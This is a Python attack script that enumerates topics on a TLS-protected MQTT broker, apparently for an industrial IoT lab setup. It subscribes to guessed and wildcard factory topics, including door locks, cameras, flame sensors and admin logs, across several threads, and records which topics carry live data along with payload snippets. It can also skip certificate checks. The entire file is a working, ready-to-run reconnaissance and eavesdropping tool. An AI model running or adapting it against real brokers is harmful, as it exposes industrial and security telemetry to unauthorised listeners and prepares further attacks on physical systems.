#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time
import threading
import argparse
import ssl
import os

class TopicEnumerationAttackTLS:
    def __init__(self, broker_host="localhost", broker_port=8883,
                 ca_certs=None, insecure=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.ca_certs = ca_certs
        self.insecure = insecure

        self.attack_stats = {
            "topics_tested": 0,
            "subscriptions_successful": 0,
            "subscriptions_failed": 0,
            "connections_failed": 0,
            "active_topics": 0,
            "start_time": None,
            "end_time": None
        }
        self.lock = threading.Lock()
        self.active_topics = set()

    def _print_cert_status(self):
        if self.ca_certs:
            print(f"  Using CA file: {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
        else:
            print("  No CA file provided; will use system CA store (if available).")
        print(f"  Insecure mode (skip verification): {self.insecure}")

    def create_client(self, client_id, username=None, password=None):
        try:
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

            # Cấu hình TLS chỉ dùng CA Certificate
            if self.ca_certs and os.path.exists(self.ca_certs):
                client.tls_set(ca_certs=self.ca_certs,
                               cert_reqs=ssl.CERT_REQUIRED,
                               tls_version=ssl.PROTOCOL_TLS_CLIENT)
            elif self.insecure:
                # Nếu không có CA nhưng muốn chạy insecure
                client.tls_set(cert_reqs=ssl.CERT_NONE)
                client.tls_insecure_set(True)
            else:
                # Mặc định hệ thống nếu không truyền CA
                client.tls_set(cert_reqs=ssl.CERT_REQUIRED, tls_version=ssl.PROTOCOL_TLS_CLIENT)

            if self.insecure:
                client.tls_insecure_set(True)

            if username and password:
                client.username_pw_set(username, password)

            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def generate_topic_candidates(self):
        topic_candidates = []
        zones = {
            "office": ["sensor_temp1", "sensor_temp2", "sensor_door1"],
            "pepsi": ["CoolerMotor", "FanSpeed"],
            "cocacola": ["CoolerMotor", "FanSpeed"],
            "energy": ["CoolerMotor", "FanSensor"],
            "production": ["PredictiveMaintenance", "HydraulicSystem", "FlameSensor"],
            "security": ["DoorLock", "Camera", "Smoke"],
            "storage": ["Temperature", "Humidity", "FlameSensor"]
        }
        for zone, devices in zones.items():
            for device in devices:
                topic_candidates.append(f"factory/{zone}/{device}/telemetry")
        for zone in zones:
            topic_candidates.append(f"factory/{zone}/+/telemetry")
        topic_candidates.extend([
            "system/status", "system/health", "admin/logs", "factory/+/+/telemetry"
        ])
        return topic_candidates

    def enumeration_worker(self, worker_id, topic_candidates, delay_ms=200, username=None, password=None):
        client_id = f"topic_{worker_id}"
        client = self.create_client(client_id, username, password)
        if not client:
            with self.lock:
                self.attack_stats["connections_failed"] += 1
            return

        def on_connect(c, u, f, rc):
            if rc == 0:
                print(f" Worker {worker_id}: Connected (TLS) ({len(topic_candidates)} topics)")
                for topic in topic_candidates:
                    try:
                        res = c.subscribe(topic, qos=0)
                        with self.lock:
                            self.attack_stats["topics_tested"] += 1
                        if isinstance(res, tuple) and res[0] == 0:
                            with self.lock:
                                self.attack_stats["subscriptions_successful"] += 1
                        else:
                            with self.lock:
                                self.attack_stats["subscriptions_failed"] += 1
                        time.sleep(delay_ms / 1000.0)
                    except Exception as e:
                        with self.lock:
                            self.attack_stats["subscriptions_failed"] += 1
            else:
                print(f" Worker {worker_id}: Connection failed ({rc})")
                with self.lock:
                    self.attack_stats["connections_failed"] += 1

        def on_message(c, u, msg):
            with self.lock:
                if msg.topic not in self.active_topics:
                    self.active_topics.add(msg.topic)
                    self.attack_stats["active_topics"] = len(self.active_topics)
                    print(f" [ACTIVE] {msg.topic} -> {msg.payload[:50]!r}")

        client.on_connect = on_connect
        client.on_message = on_message

        try:
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            listen_time = max(30, len(topic_candidates) * delay_ms / 1000.0 / 2)
            print(f" Worker {worker_id}: Listening for {listen_time:.1f}s...")
            time.sleep(listen_time)
        except Exception as e:
            print(f" Worker {worker_id}: Error: {e}")
            with self.lock:
                self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except Exception:
                pass

    def launch_attack(self, num_workers=2, delay_ms=200, custom_topics=None, username=None, password=None):
        topic_candidates = custom_topics or self.generate_topic_candidates()
        print(f"\n Starting Topic Enumeration Attack (TLS)")
        self._print_cert_status()
        self.attack_stats["start_time"] = time.time()
        threads = []
        chunks = [topic_candidates[i::num_workers] for i in range(num_workers)]
        for i, chunk in enumerate(chunks):
            t = threading.Thread(target=self.enumeration_worker, args=(i, chunk, delay_ms, username, password))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        dur = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        print("\n Attack Summary (TLS)")
        print(f"Active topics detected: {self.attack_stats['active_topics']}")
        if self.active_topics:
            for t in sorted(self.active_topics):
                print(f"  {t}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Topic Enumeration (TLS CA Only)")
    parser.add_argument("--broker", default="localhost")
    parser.add_argument("--port", type=int, default=8883)
    parser.add_argument("--workers", type=int, default=2)
    parser.add_argument("--delay", type=int, default=200)
    parser.add_argument("--topics", nargs="+")
    parser.add_argument("--username")
    parser.add_argument("--password")
    parser.add_argument("--ca", help="Path to CA certificate file")
    parser.add_argument("--insecure", action="store_true")

    args = parser.parse_args()
    attack = TopicEnumerationAttackTLS(
        broker_host=args.broker,
        broker_port=args.port,
        ca_certs=args.ca,
        insecure=args.insecure
    )
    attack.launch_attack(num_workers=args.workers, delay_ms=args.delay, custom_topics=args.topics, username=args.username, password=args.password)

if __name__ == "__main__":
    main()
